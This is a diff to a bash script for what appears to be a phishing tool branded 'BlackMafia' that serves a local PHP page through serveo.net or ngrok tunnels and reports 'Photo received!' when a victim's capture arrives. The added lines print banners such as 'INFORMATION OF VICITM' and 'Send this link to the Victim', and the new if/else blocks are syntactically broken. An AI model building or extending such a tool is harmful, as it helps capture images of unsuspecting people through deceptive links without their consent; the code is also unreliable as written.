@@ -89,7 +89,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Photo received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Photo Received!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -125,6 +125,19 @@ php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
+echo -e "\e[96m==========\e[91m INFORMATION OF VICITM \e[96m========== \e[93m"
+echo ""
+echo "" 
+read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
+echo ""
+if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
+                           
+else
+echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+printf "\e[1;33m\e[0m\e[1;35m Send this link to the Target :\e[0m\e[1;72m %s\e[0m\n" https://$link
+echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;95m ==Send this link to the Victim =\e[0m'
+fi
 
 }
 
@@ -183,7 +196,18 @@ sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
-
+echo -e "\e[96m==========\e[91m INFORMATION OF VICITM \e[96m========== \e[93m"
+echo ""
+echo "" 
+read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
+echo ""
+if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]]                           
+else
+echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+printf "\e[1;33m\e[0m\e[1;35m Send this link to the Target :\e[0m\e[1;72m %s\e[0m\n" https://$link
+echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;95m ==Send this link to the Victim =\e[0m'
+fi
 payload_ngrok
 checkfound
 }
@@ -195,8 +219,8 @@ fi
 
 printf "\n"
 clear
-bash Logo.sh
 cat Logo.txt | lolcat
+bash Logo.sh
 printf "\e[1;92m[\e[0m\e[1;72m01\e[0m\e[1;92m]\e[0m\e[1;95m BlackMafia Serveo.net\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;72m02\e[0m\e[1;92m]\e[0m\e[1;95m BlackMafia Ngrok\e[0m\n"
 default_option_server="1"
